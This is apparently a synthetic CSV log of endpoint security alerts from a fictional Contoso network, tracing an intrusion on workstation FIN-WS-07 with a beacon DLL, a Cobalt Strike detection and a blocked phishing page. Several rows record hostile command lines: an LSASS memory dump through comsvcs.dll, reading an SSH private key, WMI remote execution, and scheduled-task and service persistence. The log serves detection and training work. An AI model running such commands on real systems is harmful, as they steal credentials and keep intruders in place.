TimeGenerated,DeviceName,DeviceId,ActionType,FileName,FolderPath,SHA1,AccountName,AccountDomain,AccountSid,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,RemoteUrl,AdditionalFields,ReportId
2026-06-10T08:47:52Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ExploitGuardNonMicrosoftSignedBlocked,beacon.dll,C:\Users\alexw\AppData\Local\Temp\beacon.dll,b7c9d1253f6a8b0124e6f8a0c2d4f6e8a0b2c416,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,,"{""Feature"":""ExploitGuard"",""Mitigation"":""BlockNonMicrosoftSignedBinaries"",""ImageName"":""beacon.dll""}",4102844
2026-06-10T08:50:11Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,SmartScreenUrlWarning,,,,jamest,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3702,jamest,jamest@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,http://download.freeware-tools.io/setup.exe,"{""Experience"":""CustomBlockList"",""Decision"":""Warn"",""Url"":""download.freeware-tools.io""}",4102901
2026-06-10T08:53:39Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrPsexecWmiChildProcessAudited,wmic.exe,C:\Windows\System32\wbem\wmic.exe,c8d0e2364a7b9c0235f7a9b1d3e5f7a9b1c3d517,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,wmic.exe,"wmic.exe /node:DC01 process call create ""cmd.exe /c whoami""",cmd.exe,,"{""RuleId"":""d1e49aac-8f56-4280-b9ba-993a6d77406c"",""RuleName"":""Block process creations originating from PSExec and WMI commands"",""IsAudit"":true}",4102955
2026-06-10T08:55:02Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,SensitiveFileRead,id_rsa,C:\Users\alexw\.ssh\id_rsa,d9e1f3475b8c0d1346a8b0c2e4f6a8b0c2d4e618,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe Get-Content C:\Users\alexw\.ssh\id_rsa",rundll32.exe,,"{""SensitivityLabel"":""Credential"",""FileType"":""PrivateKey""}",4103002
2026-06-10T09:00:14Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ScheduledTaskCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,e0f2a4586c9d1e2457b9c1d3f5a7b9c1d3e5f719,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,schtasks.exe,"schtasks.exe /create /sc minute /mo 30 /tn ""MicrosoftEdgeUpdateTaskCore"" /tr ""rundll32 C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start"" /f",cmd.exe,,"{""TaskName"":""MicrosoftEdgeUpdateTaskCore"",""Trigger"":""SCHEDULE_MINUTE"",""Technique"":""T1053.005""}",4103088
2026-06-10T09:02:47Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ServiceInstalled,sc.exe,C:\Windows\System32\sc.exe,f1a3b5697d0e2f3568c0d2e4a6b8c0d2e4f6a820,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,sc.exe,"sc.exe create WinDefendSvc binPath= ""C:\Users\alexw\AppData\Local\Temp\svc.exe"" start= auto",cmd.exe,,"{""ServiceName"":""WinDefendSvc"",""StartType"":""auto"",""ImagePath"":""C:\\Users\\alexw\\AppData\\Local\\Temp\\svc.exe""}",4103140
2026-06-10T09:05:33Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrLsassCredentialTheftBlocked,lsass.exe,C:\Windows\System32\lsass.exe,a2b4c6708e1f3a4679d1e3f5b7c9d1e3f5a7b921,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 712 C:\Users\alexw\AppData\Local\Temp\lsass.dmp full",mshta.exe,,"{""RuleId"":""9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2"",""RuleName"":""Block credential stealing from the Windows local security authority subsystem (lsass.exe)"",""IsAudit"":false}",4103205
2026-06-10T09:08:19Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AntivirusDetection,svc.exe,C:\Users\alexw\AppData\Local\Temp\svc.exe,b3c5d7819f2a4b578ae2f4a6c8d0e2f4a6b8c022,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,sc.exe,"sc.exe create WinDefendSvc binPath= ""C:\Users\alexw\AppData\Local\Temp\svc.exe"" start= auto",cmd.exe,,"{""ThreatName"":""Backdoor:Win32/CobaltStrike.B"",""DetectionSource"":""Antivirus"",""Severity"":""Severe"",""WasRemediated"":true}",4103260
2026-06-10T09:11:40Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,FirewallOutboundConnectionBlocked,beacon.dll,C:\Users\alexw\AppData\Local\Temp\beacon.dll,c4d6e8920a3b5c689bf3a5b7d9e1f3a5b7c9d123,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,badupdate-cdn.com,"{""RemoteIP"":""185.220.101.2"",""RemotePort"":443,""Direction"":""Out"",""RemoteUrl"":""badupdate-cdn.com""}",4103318
2026-06-10T09:13:05Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,UserAccountAddedToLocalGroup,net.exe,C:\Windows\System32\net.exe,d5e7f9031b4c6d790ca4b6c8e0f2a4b6c8d0e224,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,net.exe,"net.exe localgroup administrators alexw /add",cmd.exe,,"{""GroupName"":""Administrators"",""AddedMember"":""CONTOSO\\alexw"",""Technique"":""T1098""}",4103377
2026-06-10T09:14:48Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,AntivirusScanCompleted,,,,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,System,,MsMpEng.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2404.6-0\MsMpEng.exe""",services.exe,,"{""ScanType"":""QuickScan"",""ThreatsFound"":0,""Result"":""Completed""}",4103401
2026-06-10T09:15:22Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,PnpDeviceConnected,,,,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,explorer.exe,explorer.exe,winlogon.exe,,"{""DeviceDescription"":""Kingston DataTraveler 3.0"",""ClassName"":""DiskDrive"",""DeviceId"":""USBSTOR\\DISK&VEN_KINGSTON""}",4103455
2026-06-10T08:31:07Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ExploitGuardSmartScreenBlocked,,,,jamest,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3702,jamest,jamest@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,http://login-contoso-sso.com/portal,"{""Experience"":""Phishing"",""Decision"":""Blocked"",""Url"":""login-contoso-sso.com""}",4102188
2026-06-10T08:58:26Z,DC01,c0c0c0c0-2222-3333-4444-000000000001,AsrPsexecWmiChildProcessBlocked,cmd.exe,C:\Windows\System32\cmd.exe,e6f8a0142c5d7e891bd3f5a7c9e1f3a5c7d9e025,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WmiPrvSE.exe,"cmd.exe /c whoami",WmiPrvSE.exe,FIN-WS-07,"{""RuleId"":""d1e49aac-8f56-4280-b9ba-993a6d77406c"",""RuleName"":""Block process creations originating from PSExec and WMI commands"",""IsAudit"":false,""RemoteDevice"":""FIN-WS-07""}",4103044
